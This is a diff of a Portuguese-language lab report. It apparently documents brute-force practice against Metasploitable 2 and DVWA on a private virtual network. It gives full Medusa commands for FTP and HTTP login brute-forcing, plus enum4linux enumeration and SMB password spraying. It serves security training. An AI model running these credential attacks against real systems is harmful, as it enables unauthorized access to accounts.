@@ -12,19 +12,22 @@
 - VMs:
   - Kali Linux (192.168.56.102)
   - Metasploitable 2: (192.168.56.101)
-  - DVWA em /var/www/html/dvwa
 
 ## 3. Ferramentas
-- Medusa, enum4linux, smbclient, curl, netcat, wireshark
+- Medusa, enum4linux, smbclient
 
 ## 4. Wordlists usadas
 - users.txt
 - passwords.txt
 
 ## 5. Comandos Executados
+### Teste de Identificação
+`ping -c 4 192.168.56.101`
+
 ### Criação de Wordlists
 `echo -e "user\nmsfadmin\nroot\nadmin" > users.txt`
 `echo -e "123456\npassword\nmsfadmin\nqwerty" > passwords.txt`
+
 ### FTP
 `medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp -t 4 -v 4 | tee medusa_ftp.log`
 - Legenda de flags:
@@ -35,14 +38,14 @@
   - -t 4 threads (execuções simultâneas)
   - -v 4 verbose (detalhe de output no terminal)
 
-tee medusa_ftp.log para salvar saída
+*tee medusa_ftp.log para salvar saída*
 
-### HTTP (template)
-`medusa -h 192.168.56.101 -M http_form -m FORM:... -U users.txt -P passwords.txt -t 6 -v 4 | tee medusa_http.log`
+### HTTP
+`medusa -h 192.168.56.101 -M http -m PAGE:'/dvwa/login.php' -m FORM:'username^USER^&password^PASS^&Login=Login' -m 'FAIL=Login failed' -U users.txt -P passwords.txt -t 6 | tee medusa_http.log`
 
 ### SMB / Password Spraying
 `enum4linux -a 192.168.56.101`
-`medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M smbnt -t 4 -v 4 | tee medusa_smb.log`
+`medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M smbnt -t 2 -T 50 | tee medusa_smb.log`
 
 ## 6. Resultados e validação
 - Credenciais descobertas:
